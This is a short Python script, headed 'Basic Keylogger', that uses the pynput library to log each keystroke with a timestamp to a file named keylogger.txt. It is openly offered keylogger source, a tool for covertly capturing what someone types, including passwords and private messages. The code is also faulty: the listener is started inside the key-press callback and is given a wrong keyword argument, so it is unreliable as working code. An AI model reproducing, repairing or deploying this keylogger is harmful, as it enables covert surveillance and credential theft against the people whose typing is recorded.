# Basic Keylogger
# Author: Neel Paranjape 
#
from pynput.keyboard import Key, Listener 
import logging

logging_directory = ''
logging.basicConfig(filename = (logging_directory + "keylogger.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')

def keyPress(key):
    logging.info(str(key))
    
    with Listener (keyPress=keyPress) as listener:
        listener.join()


